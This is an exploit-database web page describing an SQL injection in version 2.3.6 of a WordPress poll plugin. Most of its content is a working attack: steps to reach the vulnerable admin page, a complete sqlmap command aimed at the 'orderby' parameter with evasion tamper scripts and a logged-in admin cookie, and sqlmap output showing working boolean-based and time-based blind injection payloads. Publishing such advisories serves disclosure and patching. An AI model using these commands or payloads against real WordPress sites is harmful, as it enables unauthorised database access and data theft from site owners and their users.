---
title: WordPress Poll 2.3.6 SQL Injection
url: https://cxsecurity.com/issue/WLB-2024070024
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-07-10
fetch_date: 2025-10-06T17:38:36.407396
---

# WordPress Poll 2.3.6 SQL Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **WordPress Poll 2.3.6 SQL Injection** **2024.07.09**  Credit:  **[tmrswrr](https://cxsecurity.com/author/tmrswrr/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")** | |

# Exploit Title: WordPress Poll Plugin SQL Injection
# Date: 2024-07-06
# Exploit Author: tmrswrr
# Category : Webapps
# Vendor Homepage: https://total-soft.com/wp-poll/
# Version 2.3.6
1. \*\*Access the Admin Panel:\*\*
- Navigate to the admin panel of your WordPress site.
- Go to `TS Poll > `Create Pool ` > ` Use Theme` and save it. > https://localhost/wordpress/wp-admin/admin.php?page=ts-poll-builder&tsp-id=1
```
2. After save it back to TS Video Gallery Click title : https://localhost/wordpress/wp-admin/admin.php?page=ts-poll&orderby=Question\_Title&order=desc
3. Search for orderby parameter.
## SQLMAP COMMAND
python3 sqlmap.py -u "https://localhost/wordpress/wp-admin/admin.php?page=ts-poll&orderby=Question\_Title&order=desc" \
--batch \
--dbms=mysql \
--thread=10 \
--no-cast \
--random-agent \
-v 3 \
--tamper="between,randomcase,space2comment" \
--level=5 \
--risk=3 \
-p orderby \
--cookie="wordpress\_logged\_in\_d31d6d9d0bfd834c03c5a471886561f0=admin|1720435164|r5jSRyl4XMzcZz3xllDos9veD7hga8U8qFIWPQHv5Kr|e111b736b22043864d0f8ea6da823ca00768a110af4da612c555add1979839d1; wordpress\_sec\_d31d6d9d0bfd834c03c5a471886561f0=admin|1720435164|r5jSRyl4XMzcZz3xllDos9veD7hga8U8qFIWPQHv5Kr|173622110c7f3812695b26c96ba4905a7c760ac41e37645150dd4869ae884c4b; wordpress\_test\_cookie=WP Cookie check; wp-settings-time-1=1720266472"
## RESULT
---
Parameter: orderby (GET)
Type: boolean-based blind
Title: Boolean-based blind - Parameter replace (original value)
Payload: page=tsvg-admin&orderby=(SELECT (CASE WHEN (1078=1078) THEN 0x54535f56475f5469746c65 ELSE (SELECT 2977 UNION SELECT 8545) END))&order=desc
Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))
Type: time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload: page=tsvg-admin&orderby=TS\_VG\_Title AND (SELECT 6127 FROM (SELECT(SLEEP(5)))mIWx)&order=desc
Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])
---

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024070024)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top